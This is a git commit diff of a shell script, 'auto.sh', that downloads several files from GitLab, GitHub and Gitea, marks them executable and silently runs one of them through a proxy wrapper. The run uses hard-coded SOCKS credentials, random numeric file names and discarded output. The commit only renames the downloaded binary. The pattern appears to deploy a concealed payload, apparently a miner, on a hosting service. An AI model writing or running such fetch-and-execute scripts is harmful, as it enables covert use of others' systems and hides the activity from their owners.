328912ffb66e68904dbd53d99c3d1a6cb1f872e0
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-02 08:29:12 +0700

    Update auto.sh

--- auto.sh
+++ auto.sh
@@ -2,7 +2,7 @@ proxy="149.50.222.86"
 port="1080" 
 user="render"  
 pass="render"    
-wget -q -O 6475324545 https://gitlab.com/55113110159/dokerweb/-/raw/main/zydo191 && chmod +x 6475324545
+wget -q -O 45367543376 https://gitlab.com/55113110159/dokerweb/-/raw/main/zydo191 && chmod +x 45367543376
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
@@ -21,4 +21,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./6475324545 -c "config.json" >/dev/null 2>&1
+./panel ./45367543376 -c "config.json" >/dev/null 2>&1
